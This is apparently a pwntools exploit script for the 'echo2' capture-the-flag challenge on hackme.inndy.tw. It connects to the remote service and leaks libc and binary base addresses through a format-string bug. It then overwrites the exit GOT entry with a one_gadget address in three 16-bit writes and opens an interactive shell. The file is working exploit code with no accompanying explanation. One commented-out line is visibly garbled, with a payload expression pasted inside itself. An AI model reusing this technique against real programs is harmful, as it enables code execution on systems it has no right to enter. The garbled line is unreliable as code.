from pwn import *
import time
#context.log_level = 'debug'
#p = process('./echo2',env = {"LD_PRELOAD": "../libc-2.23.so.x86_64"})
p = remote('hackme.inndy.tw',7712)
elf = ELF('./echo2')

offset = 6
offset_printf_got = elf.got['printf']

payload = 'a' + '%43$p' + 'b' + '%41$p'
p.sendline(payload)
p.recvuntil('a')
__libc_start_main_ret = int(p.recvuntil('b',drop = True),16)
elf_base = int(p.recvuntil('\n',drop = True),16) - 0xa03
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_exit_got = 0x0000000000201048

libc_base = __libc_start_main_ret - offset___libc_start_main_ret
system_addr = libc_base + offset_system
exit_got = elf_base + offset_exit_got
one_gadget = libc_base + 0x45206

log.success('libc base addr : %x ' %libc_base)
log.success('elf base addr : %x ' %elf_base)
log.success('system addr : %x ' %system_addr)
log.success('exit_got : %x ' %exit_got)
log.success('one_gadget addr : %x ' %one_gadget)
#print hex(elf_base + 0x984)
#gdb.attach(p)


# if len( str((one_gadget & 0xffff) ) ) == 5:
# 	payload = 'aaaa%' + str((one_gadget & 0xffff) - 4) + 'c%8$hn' + p64(exit_got)
# else:
# 	payload = 'aaaaa%' + str((one_gadget & 0xffff) - 5) + 'c%8$hn' + p64(exit_got)
payload = ('%' + str((one_gadget & 0xffff) ) + 'c%8$hn').ljust(16,'a') + p64(exit_got)
p.sendline(payload)

# if len( str(((one_gadget >> 16) & 0xffff)) ) == 5 :
# 	payload = 'aaaa%' + str(((one_gadget >> 16) & 0xffff) - 4) + 'c%8$hn' + p64(exit_got + 2)
# elif len( str(((one_gadget >> 16) & 0xffff)) ) == 4:
# 	payload = 'aaaaa%' + str(((one_gadget >> 16) & 0xffff) - 5) + 'c%8$hn' + p64(exit_got + 2)
# else:
# 	payload = 'aaaaaa%' + str(((one_gadget >> 16) & 0xffff) - 6) + 'c%8$hn' + p64(exit_got + payload = 'aaaaaa%' + str(((one_gadget >> 16) & 0xffff) - 6) + 'c%8$hn' + p64(exit_got + 2)2)
payload = ('%' + str(((one_gadget >> 16) & 0xffff) ) + 'c%8$hn').ljust(16,'a') + p64(exit_got + 2)
p.sendline(payload)

# if len( str(((one_gadget >> 32) & 0xffff)) ) == 5 :
# 	payload = 'aaaa%' + str(((one_gadget >> 32) & 0xffff) - 4) + 'c%8$hn' + p64(exit_got + 4)
# elif len( str(((one_gadget >> 32) & 0xffff)) ) == 4:
# 	payload = 'aaaaa%' + str(((one_gadget >> 32) & 0xffff) - 5) + 'c%8$hn' + p64(exit_got + 4)
# else:
# 	payload = 'aaaaaa%' + str(((one_gadget >> 32) & 0xffff) - 6) + 'c%8$hn' + p64(exit_got + 4)
payload = ('%' + str(((one_gadget >> 32) & 0xffff) ) + 'c%8$hn').ljust(16,'a') + p64(exit_got + 4)
p.sendline(payload)
p.sendline('exit')


p.interactive()

